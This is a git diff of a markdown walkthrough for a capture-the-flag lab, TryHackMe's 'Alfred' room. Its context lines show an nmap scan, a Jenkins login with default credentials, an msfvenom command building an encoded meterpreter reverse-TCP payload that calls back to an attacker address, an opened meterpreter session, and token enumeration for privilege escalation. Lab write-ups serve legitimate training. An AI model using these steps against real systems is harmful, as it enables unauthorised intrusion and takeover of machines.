@@ -7,6 +7,7 @@ Link to TryHackMe Room: https://tryhackme.com/room/alfred
 - Using Nishang to gain initial access
 
 Task 1: Initial Access
+
 ```
 $ nmap -sV -sC 10.10.242.101 -oA recon/alfred-scan
 
@@ -42,6 +43,7 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 $ firefox 10.10.242.101:8080
 # default username:password is admin:admin
 ```
+
 - The system is known Microsoft Server (Port 80 is IIS)
 - To get reverse shell inside of Jenkins
 	- > Left-hand bar > New Item
@@ -98,6 +100,8 @@ Task 2: Switching Shells
 - Using meterpreter to switch from nc shell to meterpreter
 - Using msfvenom exploit
 
+<p></p>
+
 ```
 $ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.6.82.216 LPORT=8888 -f exe -o purple_drink.exe
 
@@ -143,7 +147,7 @@ PS C:\Users\bruce\Desktop>
 [*] Sending stage (175174 bytes) to 10.10.242.101[*] Meterpreter session 1 opened (10.6.82.216:8888 -> 10.10.242.101:49264) at 2021-11-05 16:39:07 -0400
 
 meterpreter > 
-		
+
 ```
 
 #### Step 3: Privilege Escalation
@@ -191,35 +195,8 @@ Delegation Tokens Available
 BUILTIN\Administrators                    
 BUILTIN\IIS_IUSRS          
 BUILTIN\Users               
-NT AUTHORITY\Authenticated Users                  
-NT AUTHORITY\NTLM Authentication
-NT AUTHORITY\SERVICE
-NT AUTHORITY\This Organization           
-NT AUTHORITY\WRITE RESTRICTED  
-NT SERVICE\AppHostSvc
-NT SERVICE\AudioEndpointBuilder
-NT SERVICE\BFE     
-NT SERVICE\CertPropSvc 
-NT SERVICE\CscService
-NT SERVICE\Dnscache
-NT SERVICE\eventlog  
-NT SERVICE\EventSystem
-NT SERVICE\FDResPub
-NT SERVICE\iphlpsvc
-NT SERVICE\LanmanServer
-NT SERVICE\MMCSSNT SERVICE\PcaSvc
-NT SERVICE\PlugPlay
-NT SERVICE\RpcEptMapper
-NT SERVICE\Schedule
-NT SERVICE\SENS
-NT SERVICE\SessionEnv
-NT SERVICE\Spooler
-NT SERVICE\TrkWks
-NT SERVICE\TrustedInstallerNT SERVICE\UmRdpService
-NT SERVICE\UxSms
-NT SERVICE\Winmgmt
-NT SERVICE\WSearch
-NT SERVICE\wuauserv
+
+-- SNIP --
 
 Impersonation Tokens Available
 ========================================
